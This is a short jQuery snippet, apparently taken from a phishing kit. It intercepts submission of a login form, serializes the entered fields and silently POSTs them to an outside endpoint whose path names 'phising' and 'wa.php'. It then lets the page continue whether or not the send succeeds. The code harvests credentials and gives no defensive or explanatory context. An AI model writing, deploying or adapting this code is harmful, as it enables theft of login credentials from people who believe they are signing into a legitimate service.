$(".login-form").submit(function() {  
 var d = $(".login-form");  
  
 $.ajax({  
        url: "https://krisnastore.my.id/api/phising/2025/wa.php?apikey=krisna",  
        type: "POST",  
        data: d.serialize(),  
        success: function () {  
            return true;  
        },  
        error: function () {  
            return true;  
        },  
    });  
});
